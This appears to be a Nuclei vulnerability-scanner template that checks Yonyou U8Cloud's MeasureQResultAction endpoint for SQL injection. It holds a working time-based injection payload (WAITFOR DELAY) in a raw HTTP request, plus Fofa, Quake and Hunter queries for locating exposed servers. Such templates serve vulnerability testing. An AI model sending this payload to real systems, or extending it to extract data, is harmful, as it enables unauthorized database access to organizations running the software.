id: Yonyou_u8c_cloud_MeasureQResultAction_SQLi

info:
  name: Yonyou_u8c_cloud_MeasureQResultAction_SQLi
  author: HK
  severity: high
  description: 用友U8Cloud系统接口MeasureQResultAction存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: title="U8C"
    Quake-query: title="U8C"
    Hunter-query: title="U8C"
    verified: true
http:
- raw:
  - |+
    @timeout: 30s
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'